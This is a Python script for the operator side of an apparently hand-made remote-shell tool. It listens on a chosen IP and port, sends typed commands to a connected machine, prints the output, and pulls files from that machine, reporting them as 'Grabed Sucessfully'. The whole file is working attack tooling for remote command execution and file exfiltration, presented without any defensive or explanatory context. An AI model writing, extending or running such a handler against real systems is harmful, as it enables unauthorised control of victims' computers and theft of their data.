import socket
import os
import time
import subprocess
import sys
            
class Connection:
    def Start_Connection():
        Connect=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        IP_ADDR=input("Enter Your HOST IP Address :: ")
        PORT=int(input("Enter PORT Number :: "))
        Connect.bind((IP_ADDR,PORT))
        c=int(input("Enter Number of Connections :: "))
        Connect.listen(c)
        print("[*] Wating For Connection !!")
        Reciver,addr=Connect.accept()
        print(f"Connection to {addr} Established !!")
        while True:
            cmd=input("$>")
            if cmd=='exit':
                subprocess.run('exit',shell=True)
                Connect.close()
                print("Closed")
                sys.exit(0)
            elif cmd=='clear':
                subprocess.run('cls',shell=True)
            Reciver.send(bytes(cmd,'utf-8'))
            w=Reciver.recv(15024).decode()
            print(w)
            if w=='1':
                s=os.getcwd()
                print(s)
                name=Reciver.recv(1024).decode()
                a=s+'/'+name
                print(a)
                f=open(name,'x')
                f.close()
                g=open(name,'w')
                data=Reciver.recv(1024).decode()
                g.write(data)
                g.close()
                print("[*] Grabed Sucessfully")
                
a=Connection()
Connection.Start_Connection()
